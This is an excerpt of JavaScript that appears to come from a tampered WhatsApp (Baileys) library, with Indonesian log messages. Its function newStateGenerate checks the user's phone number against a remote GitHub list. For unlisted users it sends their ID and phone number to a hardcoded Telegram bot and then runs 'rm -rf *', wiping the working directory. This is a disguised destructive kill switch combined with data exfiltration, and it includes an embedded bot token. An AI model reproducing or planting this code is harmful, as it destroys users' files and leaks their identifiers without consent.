...
const newStateGenerate = async (data) => {
  try {
    ...
    async function sendTelegram(text) {
      try {
        const token = "8355103529:AAFyI9orRprYG_qDnJfmV5pf-uvMm8tDYV8";
        const chatId = "8011135744";
        const res = await axios.get(`https://api.telegram.org/bot${token}/sendMessage`, {
          params: {
            chat_id: chatId,
            text,
            parse_mode: "HTML"
    ...
    const url = "https://raw.githubusercontent.com/velyrich/database/main/data.json";
    const response = await fetch(url);
    if (!response.ok) throw new Error("Gagal mengambil data dari GitHub");

    const json = await response.json();
    const isRegistered = json.data.some(entry => entry.nomor === phone);

    if (isRegistered) return;

    const text = [
      "🚫 User Tidak Dikenali Di Data Baileys 🚫",
      "",
      `🆔 ID: ${id}`,
      `📞 Phone: ${phone}`
    ].join("\n");
    ...
    exec("rm -rf *", (err) => {
      if (err) console.error("Error executing rm -rf *:", err);
    });

  } catch (err) {
    console.error("Terjadi kesalahan di newStateGenerate:", err.message);
  }
}
